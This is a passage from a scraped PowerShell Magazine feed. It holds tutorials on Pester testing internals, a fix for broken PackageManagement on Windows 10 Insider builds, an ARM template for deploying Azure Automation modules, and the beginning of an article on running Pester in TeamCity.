single-iteration-loop is added around every test case. The setup and teardown functionality enables you run code before and after every test case. Using a combination of try-catch-finally and try-catch blocks it guarantees that the teardown code will run even if the test fails, but exception in the teardown code will not fail the whole suite. Skip and Pending parameters enable you to force the test into states different from Pass and Fail. Skip and Pending states are useful for temporarily putting some tests on hold and for notifying you of empty tests. TestCases parameter enables you to define examples of input and expected values, which will result in the test being run once for each of the examples.  Context and Describe The Context and Describe are mainly the so-called syntactic sugar, a language construct that helps us explain our intentions better. They also let us organize the code in per-feature and per-use-case groups. Context and Describe differ slightly in Pester, but we will disregard those minor differences and will implement both groups by a single function.\nfunction Test-Block ([String]$Name, [ScriptBlock]$ScriptBlock) { try { $Global:IndentationLevel++ Write-Host -ForegroundColor Magenta (Indent-Line \u0026#34;Block $Name\u0026#34;) \u0026amp;$ScriptBlock } catch [Exception] { Write-Host -ForegroundColor Red (Indent-Line \u0026#34;${Name}: Run failed in block because $_\u0026#34;) } finally { $Global:IndentationLevel-- } } The Test-Block again uses the familiar try-catch pattern. This is not by accident. Any code can be provided in the $ScriptBlock. This means that the code in Test-Block might fail, and we need to protect our test runner from that. We do not want exceptions to prevent us from running all test blocks.\nApart from that, we also thrown in some nice indentation. The indentation level is stored in a global variable and simply translated to tabulator spacing.\n$Global:IndentationLevel = 0 function Assert-Equal ($Expected, $Actual) { if ($Actual -ne $Expected) { throw \u0026#34;Value \u0026#39;$Expected\u0026#39; was expected, but was \u0026#39;$Actual\u0026#39;\u0026#34; } } function Test-Case ([String]$Name, [ScriptBlock]$ScriptBlock) { try { $Global:IndentationLevel++ \u0026amp;$ScriptBlock Write-Host -ForegroundColor Green (Indent-Line \u0026#34;${Name}: Test passed.\u0026#34;) } catch [Exception] { Write-Host -ForegroundColor Red (Indent-Line \u0026#34;${Name}: Test failed because $_\u0026#34;) } finally { $Global:IndentationLevel-- } } function Test-Block ([String]$Name, [ScriptBlock]$ScriptBlock) { try { $Global:IndentationLevel++ Write-Host -ForegroundColor Magenta (Indent-Line \u0026#34;Block $Name\u0026#34;) \u0026amp;$ScriptBlock } catch [Exception] { Write-Host -ForegroundColor Red (Indent-Line \u0026#34;${Name}: Run failed in block because $_\u0026#34;) } finally { $Global:IndentationLevel-- } } function Indent-Line { param ( [Parameter(Mandatory=$true,ValueFromPipeline=$true)] [String[]] $Line ) begin { $indent = $Global:IndentationLevel - 1 } process { foreach($l in $Line) { \u0026#34;`t\u0026#34; * $indent + $l } } } Test-Block \u0026#34;Describe\u0026#34; { Test-Block \u0026#34;Context\u0026#34; { Test-Case \u0026#34;Eight is four\u0026#34; { $expected = 8 $actual = 4 Assert-Equal -actual $actual -expected $expected } Test-Case \u0026#34;Ten is ten\u0026#34; { $expected = 10 $actual = 10 Assert-Equal -actual $actual -expected $expected } } Test-Block \u0026#34;Context 2\u0026#34; { Test-Case \u0026#34;I will fail\u0026#34; { throw } } } Summary This concludes our review of Describe, Context and It. Hopefully you saw that a test runner is very simple at its core. Both Test-Case and Test-Block use very similar code. They execute input ScriptBlock and handle every possible exception.\nDo not worry if the implementation of Test-Case seems too simplified in comparison to It. The It function handles more concerns than just error handling and output that we described in this article. We will look at those concerns in some of the upcoming articles.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/12/03/pester-explained-describe-context-and-it-blocks/","tags":["DevOps","Pester"],"title":"Pester Explained: Describe, Context, and It Blocks"},{"categories":["DevOps","Pester"],"contents":"This article is a part of a larger series on Pester.\nLast time we looked at the theory of assertions and what mechanisms they use to fail our tests. We’ve also written two assertions of our own to become a part of our own test framework. In this article we won’t be continuing on out own framework though. Instead we will look more closely on the actual implementation of Pester assertions and walk through the process of failing a test in Pester.\nIn this article we will be looking just at the Should Be family of assertions, but keep in mind that the rest of the assertions work the same way. A condition is evaluated (be it some value comparison, if a file exists, or if an exception was thrown) and if the condition is not satisfied (False) an exception is thrown.\nDigging in When you look inside of the sources of Pester you will find a whole folder dedicated to assertions. This folder is, unsurprisingly, called “Assertions” and resides inside of the “Function” folder. Similarly as the assertion keywords are split in two words, Should and Be, the assertion implementation is also split in two kinds of files. The Should.ps1 that defines the shared logic of all Pester assertions and Be.ps1, Throw.ps1, Exist.ps1 etc. which contain logic specific to the respective assertions.\nBe.ps1 Looking inside of Be.ps1, on the top of the file there is the function that we’ve been looking at in the previous article, the equality condition that determines the result of the test:\nfunction PesterBe($value, $expected) { return ($expected -eq $value) } It uses the standard equality (-eq) operator of PowerShell, and returns a Boolean (true or false) result. Throwing the exception is done elsewhere.\nYou might also notice that the function is called “PesterBe” rather than “Be”, this naming convention was chosen in the early versions of Pester to avoid conflicts with user defined code. This need was eliminated by putting the whole Pester runtime in different scope (in version 3), effectively hiding the internals of Pester from user code. The details of how that is done will be described in one of the future articles.\nFurther down the file you may also notice an implementation of another, but very similar, assertion named PesterBeExactly. This case sensitive version of the Be assertion uses the case sensitive equality operator (-ceq), and so the different behavior only applies to strings.\nBoth the assertion condition implementations are accompanied with multiple function that produce various failure messages. The ones with Exactly in name are used when the BeExactly assertion is used, and the ones with Not in name are used when a negative version the assertion (e.g. Should Not Be) is called. The functions are also type aware so a message pointing at first different character will be produced when comparing strings.\nfunction PesterBeFailureMessage($value, $expected) { if (-not (($expected -is [string]) -and ($value -is [string]))) { return \u0026#34;Expected: {$expected}`nBut was: {$value}\u0026#34; } ... ( Get-CompareStringMessage -Expected $expected -Actual $value ) -join \u0026#34;`n\u0026#34; } The assertion condition (the PesterBe function) remains the same for the negative and non-negative call of the assertion though, the result is simply negated when a negative assertion is used.\nShould.ps1 The Should.ps1 file holds the shared logic for the assertions. When calling an assertion you are in fact invoking a function named Should that takes pipeline input and an indeterminate amount of arguments (notice the $args variable and no param block).\nfunction Should { begin { Assert-DescribeInProgress -CommandName Should $parsedArgs = Parse-ShouldArgs $args } ... } This, in theory would mean that you can have a very rich API for assertions, but in reality parsing a vast amount of different inputs correctly, while keeping intuitive syntax is difficult to do, and so the parsing logic is kept very simple. In general the expected input is assumed to be this:\n\u0026lt;Expected\u0026gt; | Should (optional)Not \u0026lt;AssertionName\u0026gt; \u0026lt;Value\u0026gt; Any additional arguments are simply ignored.\nThe processing of the input is done in the Parse-ShouldArgs where the captured input is processed. Let’s see how a “1 | Should Not Be 10” would be processed:\nParse-ShouldArgs Not,Be,10 #output Name Value ---- ----- PositiveAssertion False ExpectedValue 10 AssertionMethod PesterBe The “Be” assertion method is translated to “PesterBe”, referring to the function we saw earlier in the Be.ps1 file. The “Not” is captured as “PositiveAssertion:$False”, and the expected value obviously became the “ExpectedValue”.\nNotice that the actual value is not captured in the output. That is because the call to Parse-ShouldArgs is placed in the begin block of the function where the pipeline output is not available. The actual value will be captured later.\nNote: This approach to calling functions is totally incoherent with the rest of PowerShell cmdlets. In your functions you should follow the correct approach of defining named parameters that take single argument value, or in special cases define ValueFromRemainingArguments attribute (see Write-Host). Avoid using the $args for anything else than getting an indeterminate amount of data. The way the $args is used in Pester is the legacy of the early versions of Pester where at first a fluent API like syntax was used, which was later migrated to the current approach in attempt to closely follow the language of RSpec testing framework. We are aware that the current syntax could be improved greatly, but unfortunately it’s so widely used that it is unlikely that it will go away any time soon.\nfunction Should { begin { Assert-DescribeInProgress -CommandName Should $parsedArgs = Parse-ShouldArgs $args } end { $input.MoveNext() do { $value = $input.Current $testFailed = Get-TestResult $parsedArgs $value if ($testFailed) { ... } } until ($input.MoveNext() -eq $false) } } When the arguments are parsed by the Parse-ShouldArgs and saved in the $parsedArgs, the Should command enters the end block. In this end block the actual value provided through the pipeline (in our case number 1) becomes available. The Should then continues to stepping through its pipeline input, invoking Get-TestResult on each of them.\nThe Get-TestResult function, residing in the Should.ps1 file, is rather simple. It takes the parsed should arguments (including the expected value) and the actual value and returns a boolean result. To determine the result it invokes the assertion condition (the PesterBe function) on the expected and actual values.\nfunction Get-TestResult($shouldArgs, $value) { $assertionMethod = $shouldArgs.AssertionMethod $command = Get-Command $assertionMethod -ErrorAction $script:IgnoreErrorPreference ...throw on incorrect assertion name #for 1 | Should Not Be 10 #$testResult = (\u0026amp; PesterBe 1 10) $testResult = (\u0026amp; $assertionMethod $value $shouldArgs.ExpectedValue) if ($shouldArgs.PositiveAssertion) { return -not $testResult } return $testResult } The invocation of the assertion condition function is done via the ‘\u0026amp;’ invocation operator. This works because of the aforementioned naming convention for those functions: Pester +  (e.g. Pester + Be).\nAt this point we know whether the assertion passed of failed, but we only have a True/False result, no exception was thrown yet. And that is the last thing that happens in the Should function.\nfunction Should { begin { ... } end { $input.MoveNext() do { ... $testFailed = Get-TestResult $parsedArgs $value if ($testFailed) { ... $failureMessage = Get-FailureMessage $parsedArgs $value throw ( New-ShouldErrorRecord -Message $failureMessage -File $file -Line $line -LineText $lineText) } } until ($input.MoveNext() -eq $false) } } The result of the call to Get-TestResult function is inspected, and if it is False a failure message is obtained. Then a Pester specific exception is thrown. This exception will stop the test from executing and will fail it. Exactly as described in the previous article.\n Note: The failure message is obtained, by a pretty much the same process as getting the result of the test. But instead of invoking the assertion condition function (PesterBe), an assertion message function is called (NotPesterBeFailureMessage), producing the appropriate message.\n Comparing the implementations In the previous article we created a simple implementation of an assertion that did not take into account any parsing issues, nor different types of input objects as well as pipeline input. This left us with an extremely simple implementation, consisting only of a single “if” and “throw”:\nfunction Assert-Equal ($Expected, $Actual) { if ($Actual -ne $Expected) { throw \u0026#34;Value \u0026#39;$Expected\u0026#39; was expected, but was \u0026#39;$Actual\u0026#39;\u0026#34; } } Getting rid of all the clutter in the Should function, we can see the same basic pattern emerge:\nfunction Should { begin { ... } end { $input.MoveNext() do { ... if ($testFailed) { ... throw ( New-ShouldErrorRecord -Message $failureMessage -File $file -Line $line -LineText $lineText) } } until ($input.MoveNext() -eq $false) } } Which confirms that the theory that we learned the last time is applied in the actual code of Pester.\nSummary In this article we looked closely at the implementation of the Should command in Pester. Described the process needed to fail an unsuccessful test and compared the theory that we learned with the actual implementation.\nNext time we will look at the It and Describe blocks, how the tests are actually executed, and how the suite prevents failing on every failed test.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/12/02/pester-explained-should/","tags":["DevOps","Pester"],"title":"Pester Explained: Should"},{"categories":["DevOps","Pester"],"contents":"This article is a part of a larger series on Pester.\nI always found the word framework intimidating. It’s probably because my first encounter with the word was in .NET Framework, which at that point in time was total magic to me. There were tons of classes, keywords, and other things, and everybody except me, seemed to know the secret formula to connect the pieces together to make them do awesome stuff. And I was sitting there copying code from a book, being unable to make it work most of the time. And when it worked I was just waiting for the moment when the magic stops working and my code will break again. All in all, it took me a lot of time to understand that a framework is just code. I am not saying that I am a .NET expert now, but it feels liberating to know that no magic is likely happening in the core of my program.\nThis brings me to Pester. Pester is also called a framework, and what’s more a TESTING framework. That’s like double magic, or at least it was for me when I started learning about testing. And I am afraid a lot of you are in the same position. Wanting to learn how to test, but always fearing that the magical stuff that’s happening inside of the framework will stop working.\nBut you can’t be further from the truth, Pester is just code, and in the basic form quite simple code. And that’s why I am writing this series of posts that will cover the basic building blocks of Pester, and where you will get to write your own simpler version of Pester.\nIn the end you will hopefully be convinced that a framework is not much more than a pile of code that does exactly what it’s told.\nAssertion theory Let’s start from the end, that is from the assertions, and work our way from the inside out.\nThe assertions are what decides whether the test will pass or fail. An assertion in Pester is represented by word Should and a second word such as Be or Exist, that determines what kind of assertion should be used. The most used combination of those words is Should Be, that tests whether the actual and expected values are equal, so we will use that for our first example.\n$expected = 8 $actual = 4 $actual | Should Be $expected The $actual value typically wouldn’t be hardcoded in the test; rather it would be a result a some function call, such as Get-ProcessorCoreCount. The test would actually look more like this:\n$expected = 8 $actual = Get-ProcessorCoreCount $actual | Should Be $expected We can express the same comparison as a simple if statement:\nif ($actual -eq $expected) { $didTheTestPass = $True } else { $didTheTestPass = $False } We can also express the condition in an opposite way:\nif ($actual -ne $expected) { $didTheTestPass = $False } else { $didTheTestPass = $True } We could further get rid of the else clause, by assuming every test starts as a passing test.\n$didTheTestPass = $True if ($actual -ne $expected) { $didTheTestPass = $False } This brings one problem though–if we put two such assertions in a row, it does not matter if the first one fails or passes, because only the last assertion would determine the outcome of the test.\nThat is definitely not correct. We want the first assertion to fail to stop the execution of the test. This can likely be done in many ways, but all the testing frameworks I know, throw an exception to do that. Our assertion would look like this:\n$didTheTestPass = $True if ($actual -ne $expected) { throw \u0026#34;The test failed!\u0026#34; } At this point the $didTheTestPass does not bring any added value, because we know that any test that did not throw an exception is a passing test. The core of our assertion would look like this:\nif ($actual -ne $expected) { throw \u0026#34;The test failed!\u0026#34; } Which is simpler, but not oversimplified version of what is happening inside of Pester, after you remove all the parsing and fancy messages.\nIf you do not believe me, go to line 92 in Should.ps1 and see for yourself. The comparison is also very easy to find, it’s on line 3 in the Be.ps1 file.\nWriting your own assertion I promised that we will write a testing framework of our own, so let’s start. It won’t be exactly like Pester, but I will be pretty close. Our own framework will definitely need to have assertions, but we will avoid all the unnecessary parsing Pester does and we will create a function called Assert-Equal which will be very simple:\nfunction Assert-Equal ($expected, $actual) { if ($actual -ne $expected) { throw \u0026#34;Value \u0026#39;$expected\u0026#39; was expected, but was \u0026#39;$actual\u0026#39;\u0026#34; } } And we can write our first test (don’t forget to keep the Assert-Equal function in the same file and make sure you define it before you use it):\nfunction Assert-Equal ($Expected, $Actual) { if ($Actual -ne $Expected) { throw \u0026#34;Value \u0026#39;$Expected\u0026#39; was expected, but was \u0026#39;$Actual\u0026#39;\u0026#34; } } $expected = 8 $actual = 4 Assert-Equal -actual $actual -expected $expected Which will output:\nValue \u0026#39;8\u0026#39; was expected, but was \u0026#39;4\u0026#39; At line:5 char:3 + throw \u0026#34;Value \u0026#39;$Expected\u0026#39; was expected, but was \u0026#39;$Actual\u0026#39;\u0026#34; + CategoryInfo : OperationStopped: (Value \u0026#39;8\u0026#39; was expected, but was \u0026#39;4\u0026#39;:String) [], RuntimeException + FullyQualifiedErrorId : Value \u0026#39;8\u0026#39; was expected, but was \u0026#39;4\u0026#39; Yaay! You just wrote your first piece of a testing framework.\nExpecting exceptions As we saw earlier using exceptions to fail tests is great because the test will stop executing as soon as any assertion fails. There is also other reason why exceptions are used in most of testing frameworks: When code fails, it usually throws an exception which in turn will make your test fail without using any assertion.\nBut what if throwing an exception is the expected outcome of the test? What if we want to test that our code throws FileNotFoundException when we try to read from a file that does not exist?\nfunction Read-File ($Path) { if (-not (Test-Path $Path)) { throw [IO.FileNotFoundException]\u0026#34;The file \u0026#39;$Path\u0026#39; was not found.\u0026#34; } Get-Content $Path } Read-File C:\\NotExistingFile.txt We need a way to check if a given piece of code thrown an exception, and prevent this exception from failing the test. The try/catch statement turns out to be a perfect candidate for that:\nfunction Read-File ($Path) { if (-not (Test-Path $Path)) { throw [IO.FileNotFoundException]\u0026#34;The file \u0026#39;$Path\u0026#39; was not found.\u0026#34; } Get-Content $Path } $exceptionWasThrown = $False try { # Read-File C:\\NotExistingFile.txt } catch { $exceptionWasThrown = $True } if (-not $exceptionWasThrown) { throw \u0026#39;Expected an exception to be thrown but no exception was thrown.\u0026#39; } Notice that the call to the Read-File is commented out, so by default no code will be executed in the try block, and hence no exception will be thrown inside of the try catch block. This means that the $exceptionWasThrown will remain $False, and so the last “if” will throw an exception saying ‘Expected an exception to be thrown but no exception was thrown.’, which will fail the test.\nNow try to uncomment the call to the Read-File. The read file will throw an exception (unless you actually have a file called NotExistingFile.txt on your C: drive, of course). This exception will be swallowed by the catch block, preventing our test from failing. The catch block will also set the $exceptionWasThrown variable to $True, the condition of the last “if” won’t be satisfied, and as a result the whole script won’t produce any output, meaning that our test passed.\nAssert-Throw We could definitely use such useful assertion in our own framework, so let’s create a function named Assert-Throw, which will look like this:\nfunction Assert-Throw ([ScriptBlock]$ScriptBlock) { $exceptionWasThrown = $False try { \u0026amp;$ScriptBlock } catch { $exceptionWasThrown = $True } if (-not $exceptionWasThrown) { throw \u0026#39;Expected an exception to be thrown but no exception was thrown.\u0026#39; } } As you can see the body of the function is almost the same as the code in the previous script, the only challenge that we needed to solve was getting the piece of code that should throw an exception as a parameter. We used a script block for that. A script block is a piece of code that we can execute at the right time and place using the ‘\u0026amp;’ operator.\nYou can try using our new assertion, but expect no output because the Read-File throws an exception, which is what we want to happen and so our test passes:\nfunction Read-File ($Path) { if (-not (Test-Path $Path)) { throw [IO.FileNotFoundException]\u0026#34;The file \u0026#39;$Path\u0026#39; was not found.\u0026#34; } Get-Content $Path } function Assert-Throw ([ScriptBlock]$ScriptBlock) { $exceptionWasThrown = $False try { \u0026amp;$ScriptBlock } catch { $exceptionWasThrown = $True } if (-not $exceptionWasThrown) { throw \u0026#39;Expected an exception to be thrown but no exception was thrown.\u0026#39; } } Assert-Throw -ScriptBlock { Read-File C:\\NotExistingFile.txt } Is there more to it? Now that we covered two different assertions, you might ask: Is there more to it? And the answer would be: No, not really.\nEvery other assertion in Pester is just a variation on the Should Be (or in our case Assert-Equal). The difference between Should Be, Should Match, or Should Exist is only in the condition where in the “if” condition they use -eq, -match and Test-Item respectively, but the mechanism remains the same.\nSingle exception of this rule is the Should Throw assertion which on the outside acts same as the other assertions, but internally uses slightly different code to throw assertion when none was thrown, and do nothing when any assertion was thrown. If you’d like to compare the actual implementation in Pester with our own simplified assertion, and I encourage you to do so, please go to line 11 in PesterThrow.ps1.\nSummary So far you learned how assertions work internally and how they make tests fail. Next time we will look at the insides of Pester, and walk through the actual assertion implementation.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/12/01/pester-explained-introduction-and-assertions/","tags":["Pester","DevOps"],"title":"Pester Explained: Introduction and Assertions"},{"categories":["Package Management"],"contents":"I’ve been running in the Windows Insiders fast ring since it was incepted and went from Windows 8.1 to Windows 10 November update with all the insider builds in between. I must say, Windows upgrades have never felt so stable and this has proven to be the fastest way to the newest WMF 5.0 builds.\nA couple of months ago though, I stumbled upon a curious issue where my PackageManagement module misbehaved after a fast ring update. Find-Module would complain about a missing PSModule provider and I wasn’t able to do anything anymore in regard to interacting with the PowerShell Gallery. I’ve investigated and finally contacted the PowerShell team. We found out I got an issue which was very unlikely to occur and after we fixed it we decided not to publish a blog because of the unlikelihood of the occurrence. Now, a couple of months later and on Windows 10 November update, I’ve found a couple of others who’ve experienced my issue as well. Hence this blog post.\nThe Issue First let’s look at the current behavior when you are dealing with this issue.\nWhen running Find-Module, you’ll see some error’s being thrown. Most notably about the missing PowerShellGet module provider. When we check the Package Providers available to us, we can indeed see it is missing. Note that if you are on an older build, PowerShellGet provider was called PSModule so your error could be slightly different.\nThe source of the issue lays within multiple PackageManagement modules being present on the system.\nThis can occur if you have been on Windows flights since early January (pre RTM) this year. If you installed Windows 10 RTM and are on the Windows 10 flights since Windows 10 RTM, you should not see this issue.\nThe PackageManagement module used to be under $PSHOME\\Modules folder in earlier Windows builds (before Windows 10 RTM) but as part of Windows 10 RTM it is moved to the $env:ProgramFiles\\WindowsPowerShell\\Modules folder. You might not have noticed this earlier as the module version was the same but with the November update the version was incremented to 1.0.0.1.\nModules are loaded with precedence from $PSHOME\\Modules over Program Files modules so the incompatible v1.0.0.0 module is loaded by default.\nThe fix There is no easy way to remove files from System32 when they are owned by the TrustedInstaller principal. It requires you to have Security Privileges enabled which you don’t have by default when running PowerShell (not even when elevated). Although there are a lot of cool tricks out there to deal with this situation (e.g. see Boe Prox’s awesome module http://learn-powershell.net/2015/06/03/managing-privileges-using-poshprivilege), this goes far beyond what this blog post is intended to accomplish (fixing your PackageManagement problem).\nOpen your Explorer and navigate to %windir%\\System32\\WindowsPowerShell\\v1.0\\Modules. Select the PackageManagement folder and press the delete button on your keyboard. Select Yes and on the UAC prompt select Continue. The folder should now be deleted and your PackageManagement will work again. Note that if files are locked, you probably have the module loaded in one of your PowerShell sessions.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/11/30/the-case-of-potentially-broken-packagemanagement-for-windows-10-insiders-2/","tags":["Package Management"],"title":"The case of potentially broken Package Management for Windows 10 Insiders"},{"categories":["Azure","Azure Resource Manager","Azure Automation"],"contents":"Update: Earlier generic linked template for deploying modules was removed and it was breaking my ARM template. I published two linked templates in my ARMSeries repo that can be used to deploy modules to Azure Automation accounts.\nAzure Automation has the integration module concept for extending what you can do using the runbooks. These modules are PowerShell modules and can contain functions or workflows. This article from Azure team blog explains how to author these custom integration modules. So, I won’t repeat that here and safely assume that you have a module that you want to deploy to Azure Automation. You can follow this article and try deploying the demo module I built for this purpose.\nYou can import these integration modules into Azure Automation using any of the following methods.\n Using the New-AzureRmAutomationModule cmdlet in the AzureRm.Automation module. Using the preview portal and navigating to the Assets within automation account. Using Azure Resource Manager (ARM) template  The first two methods are straightforward. I will show you the ARM template way of doing this. Btw, this is not new and has been there for a while. If you look at some of the modules on PowerShell Gallery, you will see an option to “Deploy to Azure Automation”.\nWhen you click on this button within the PowerShell Gallery page for the module, an ARM template gets deployed. In this article, I will show you how to build this ARM template yourself and deploy your custom integration modules so that you can make this a part of larger ARM template deployment process. To get started, here is the ARM template to deploy my custom module. This module is just for demonstration purpose and it has no useful activities.\n{ \u0026#34;$schema\u0026#34;: \u0026#34;http://schemas.microsoft.org/azure/deploymentTemplate?api-version=2015-01-01#\u0026#34;, \u0026#34;contentVersion\u0026#34;: \u0026#34;1.0\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;New or existing Automation account\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;allowedValues\u0026#34;: [ \u0026#34;New\u0026#34;, \u0026#34;Existing\u0026#34; ], \u0026#34;metadata\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;Select whether you want to create a new Automation account or use an existing account. WARNING: if you select NEW but use an Automation account name that already exists in your subscription, you will not be notified that your account is being updated. The pricing tier for the account will be set to free and any tags on the account will be erased.\u0026#34; } }, \u0026#34;Automation Account Name\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;The module will be imported to this Automation account. If you want to import your module to an existing account, make sure the resource group matches and you have entered the correct name. The account name must be between 6 to 50 characters, and can contain only letters, numbers, and hyphens.\u0026#34; } }, \u0026#34;Automation Account Location\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;metadata\u0026#34;: { \u0026#34;description\u0026#34;: \u0026#34;The location to deploy the Automation account in. If you select an existing account, the location field will not be used.\u0026#34; } }, \u0026#34;ModuleName\u0026#34; : { \u0026#34;type\u0026#34; : \u0026#34;String\u0026#34;, \u0026#34;metadata\u0026#34; : { \u0026#34;description\u0026#34; : \u0026#34;Name of the module being imported into the Azure Automation account.\u0026#34; } }, \u0026#34;ModuleUri\u0026#34; : { \u0026#34;type\u0026#34; : \u0026#34;string\u0026#34;, \u0026#34;metadata\u0026#34; : { \u0026#34;description\u0026#34; : \u0026#34;URI for the AA module zip archive. This must be accessible from automation account.\u0026#34; } } }, \u0026#34;variables\u0026#34;: { \u0026#34;templatelink\u0026#34;: \u0026#34;[concat(\u0026#39;https://raw.githubusercontent.com/rchaganti/armseries/master/\u0026#39;, parameters(\u0026#39;New or Existing Automation account\u0026#39;), \u0026#39;AccountTemplate.json\u0026#39;)]\u0026#34; }, \u0026#34;resources\u0026#34;: [ { \u0026#34;apiVersion\u0026#34;: \u0026#34;2015-01-01\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;nestedTemplate\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;Microsoft.Resources/deployments\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;mode\u0026#34;: \u0026#34;incremental\u0026#34;, \u0026#34;templateLink\u0026#34;: { \u0026#34;uri\u0026#34;: \u0026#34;[variables(\u0026#39;templatelink\u0026#39;)]\u0026#34;, \u0026#34;contentVersion\u0026#34;: \u0026#34;1.0\u0026#34; }, \u0026#34;parameters\u0026#34;: { \u0026#34;accountName\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;[parameters(\u0026#39;Automation Account Name\u0026#39;)]\u0026#34; }, \u0026#34;accountLocation\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;[parameters(\u0026#39;Automation Account Location\u0026#39;)]\u0026#34; }, \u0026#34;ModuleName\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;[parameters(\u0026#39;ModuleName\u0026#39;)]\u0026#34; }, \u0026#34;ModuleUri\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;[parameters(\u0026#39;ModuleUri\u0026#39;)]\u0026#34; } } } } ], \u0026#34;outputs\u0026#34;: {} } Within this ARM template, we use parameters for collecting information about the Automation account. If the provided Automation account name is a new one, we will create it first; if it’s the existing one, we can simply publish the integration module. ModuleUri can be any location where the integration module zip file is stored. This location should be accessible to the service deploying the integration module.\nIf you notice, we are using a linked template deployment. Using linked template deployments, we can decompose the ARM template into multiple small chunks that are purpose-specific templates. In the template above, I specified the linked template link in line number 23. This is a template hosted by Microsoft and the JSON template file name changes based on the automation account type we select during deployment.\nLet us see how this works! I will use the cmdlets in Azure PowerShell module to deploy this template. First authenticate to Azure using the Login-AzureRmAccount cmdlet.\nWe will now validate the above template and ensure everything is fine before we deploy it. For running the following command, you will need an existing resource group.\n$parameters = @{ \u0026#39;moduleName\u0026#39; = \u0026#39;myModule\u0026#39; \u0026#39;moduleUri\u0026#39; = \u0026#39;https://github.com/rchaganti/armseries/raw/master/MyModule.zip\u0026#39; \u0026#39;Automation Account Name\u0026#39; = \u0026#39;fuarmdemo\u0026#39; \u0026#39;Automation Account Type\u0026#39; = \u0026#39;Existing\u0026#39; \u0026#39;Automation Account Location\u0026#39; = \u0026#39;eastus2\u0026#39; \u0026#39;TemplateFile\u0026#39; = \u0026#39;C:\\Temp\\DeployModule.json\u0026#39; } Test-AzureRmResourceGroupDeployment @parameters -Verbose Once we see that the template is valid, we can go ahead and deploy it using the New-AzureRmResourceGroupDeployment cmdlet.\nNew-AzureRmResourceGroupDeployment @parameters -Verbose Once this deployment is complete, you will see output similar to this.\nYou can navigate to the Automation account on the Azure preview portal and see that the module is indeed present in the Assets blade.\nThis is it. You can use this template and make it a part of a larger ARM deployment using nested or linked template approach.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2015/11/26/deploy-custom-azure-automation-integration-modules-using-arm-templates/","tags":["Azure","Azure Automation","Azure Resource Manager"],"title":"Deploy Custom Azure Automation Integration Modules Using ARM Templates"},{"categories":["How to","DevOps"],"contents":"Posts in this series  PowerShell Tools for the Advanced Use Cases, part 1 PowerShell tools for the advanced use cases – part 2 PowerShell tools for the advanced use cases – part 3 (this article)  I am currently on board flight Qantas 423 from Sydney to Melbourne, the last hop on this very long way back home from the Midwest Management Summit in Minneapolis/Minnesota USA.\nIt was requested of me to maybe show the integration of part 1 and part 2 into the Continuous Integration (CI) server that I used in my demos.\nI have so far mostly used TeamCity and Jenkins, some customers use GO.CD or other products. For this demo I will stuck to my home lab CI Server TeamCity.\nTeamCity You can install TeamCity on Linux and on Windows. It really depends on what you will be doing with it whether it’ll be wise (or easier) to install it on Linux or Windows.\nI do a lot of cross-platform management / automation, so Linux as the hosting platform made sense, it also has tools like git already installed.\nIf all you do is Windows, then install it on Windows, works just as well.\nTeamCity is usually used as a Continuous Integration or Build server to automate builds or packaging of source / application code into deployable artefacts like MSI files, NuGet packages or plain zip files, depending on your platform. These are just the most common for Windows.\nInstallation The installation of TeamCity is very straight forward, both on Linux and Windows. Especially for lab environments you can pretty much get away with a “Next-Next-Done” installation.\nDownload the TeamCity source files from here:\nAfter installation TeamCity will have installed the TeamCity agent on the local server so that we can dive pretty much straight in.\nHigh Level build workflow Pictures are easier understood than words, so that’s why I created a little diagram to explain what we are trying to accomplish here.\nContinuous Integration Having Pester and PSScriptAnalyzer in your environment means that you will most likely have higher code quality than without. Every time you save your file, because you just finished a new function or fixed a bug maybe, you should run your Pester tests and check for any Style atrocities.\nI am lazy in that regards, I would also probably forget to do it after a while, or, because I’m human like you, become too confident with myself and just think “pff, I wrote that code, it’s awesome!” and don’t test because of that.\nThe trick is to build a workflow that picks up your code after you saved it (checked it in) and automatically runs the tests for you.\nWe also want code that passes these tests to automatically be packaged into something that we could pick up and deploy, via PowerShell, DSC, System Center Configuration Manager or, if you must, manually even.\nThis is all part of CI, makes everybody’s life easier and brings up code quality at least by a factor of 42. 😉\nFrom Code to Artefact What we are trying to achieve with Continuous Integration can be told with this short storyline:\nA Developer writes code that he/she saves and commits to Source Control. The CI Server polls the Version and Source Control (VSC) repository regularly and upon being notified that there is a change in the codebase the CI server downloads the new code to a Build Agent. The Build process is executed, our Pester tests run and PSScriptAnalyzer rules get tested. Only if all tests pass will the CI server pack the code into the desired format and upload them to the repository management server.\nHow to integrate Pester into TeamCity Pester is great, it’s so easy to handle and even easier to integrate into basically any CI Server as it can output the test results in the NUnit 2.5 format as an XML file which TeamCity knows how to interpret.\nThe Pester Github wiki even has a short explanation on how to make test results show up in TeamCity. Here’s a quick overview.\nI assume that you have already created a build project in TeamCity and added some Pester tests to your build pipeline.\nEnter your Build Configuration settings.\nSelect “Build Features”.\nSelect “Add Build Feature”.\nFill in the following values. You might need to change the path to Pester’s XML file.\n Type: XML report processing Report Type: NUnit Monitoring rules:  %teamcity.build.checkoutDir%\\pester_xml.xml    Save the changes.\nMake sure that you have one step in your build stage that executes Pester and outputs the XML to the path configured above. I’m using the following PowerShell code to ensure this:\ntry { Import-Module -Name Pester -ErrorAction Stop $checkoutdir = \u0026#34;%system.teamcity.build.checkoutDir%\u0026#34; $pester_xml = Join-Path $checkoutdir pester_xml.xml 